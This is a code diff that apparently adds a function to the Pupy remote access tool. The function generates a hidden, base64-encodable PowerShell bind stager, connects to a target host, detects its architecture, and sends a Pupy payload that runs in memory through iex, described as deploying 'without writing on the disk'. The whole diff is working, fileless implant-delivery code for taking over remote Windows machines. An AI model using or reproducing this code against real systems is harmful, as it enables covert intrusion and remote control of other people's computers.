@@ -15,6 +15,7 @@ import os.path
 import pupygen
 import ssl
 import re
+import socket
 
 # "url_random_one" and "url_random_two_x*" variables are fixed because if you break you ps1_listener, the ps1_listener payload will not be able to get stages -:(
 url_random_one      = "index.html"
@@ -184,3 +185,49 @@ def serve_ps1_payload(conf, ip="0.0.0.0", port=8080, link_ip="<your_ip>", useTar
         os.remove(output_x64)
         
         exit()
+
+def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
+    ps1_template = """$l=[System.Net.Sockets.TcpListener][BIND_PORT];$l.start();$c=$l.AcceptTcpClient();$t=$c.GetStream();
+    [byte[]]$b=0..4096|%{0};$t.Read($b, 0, 4);$c="";
+    if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64'){$t.Write([System.Text.Encoding]::UTF8.GetBytes("2"),0,1);}
+    else{$t.Write([System.Text.Encoding]::UTF8.GetBytes("1"),0,1);}
+    while(($i=$t.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$c=$c+$d; } 
+    $t.Close();$l.stop();iex $c; 
+    """    
+    main_ps1_template = """$c=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{0}'));iex $c;"""
+    hidden               = '-w hidden '
+    if nothidden: hidden = ''
+    launcher             = ps1_template.replace("[BIND_PORT]",bind_port)
+    launcher             = launcher.replace('\n','').replace('    ','')
+    basic_launcher       = "powershell.exe [HIDDEN]-noni -nop [CMD]".replace('[HIDDEN]', hidden)
+    oneliner             = basic_launcher.replace('[CMD]', '-c \"%s\"' % launcher)
+    encoded_oneliner     = basic_launcher.replace('[CMD]', '-enc %s' % b64encode(launcher.encode('UTF-16LE')))
+    print colorize("[+] ","green")+"copy/paste one of these one-line loader to deploy pupy without writing on the disk :"
+    print " --- "
+    print colorize(oneliner, "green")
+    print " --- "
+    print colorize(encoded_oneliner, "green")
+    print " --- "
+    print colorize("Generating puppy dll. Be patient...", "red")
+    tmpfile    = tempfile.gettempdir()
+    output_x86 = pupygen.generate_ps1(conf, output_dir=tmpfile, x86=True)
+    output_x64 = pupygen.generate_ps1(conf, output_dir=tmpfile, x64=True)
+    ps1_x86 = open(output_x86).read()
+    ps1_x64 = open(output_x64).read()
+    raw_input("[?] Press <enter> if you are ready to connect (to remote target)")
+    print colorize("[+] ","green")+"Connecting to {0}:{1}".format(target_ip, bind_port)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target_ip, int(bind_port)))
+    s.sendall("\n")
+    print colorize("[+] ","green")+"Receiving target architecure..."
+    version = s.recv(1024)
+    ps1_encoded = None
+    if version == '2':
+        print colorize("[+] ","green")+"Target architecture: x64"
+        ps1_encoded = main_ps1_template.format(b64encode(ps1_x64))
+    else:
+        print colorize("[+] ","green")+"Target architecture: x86"
+        ps1_encoded = main_ps1_template.format(b64encode(ps1_x86))
+    s.sendall(ps1_encoded)
+    s.close()
+    print colorize("[+] ","green")+"ps1 payload send to target {0}:{1}".format(target_ip, bind_port)
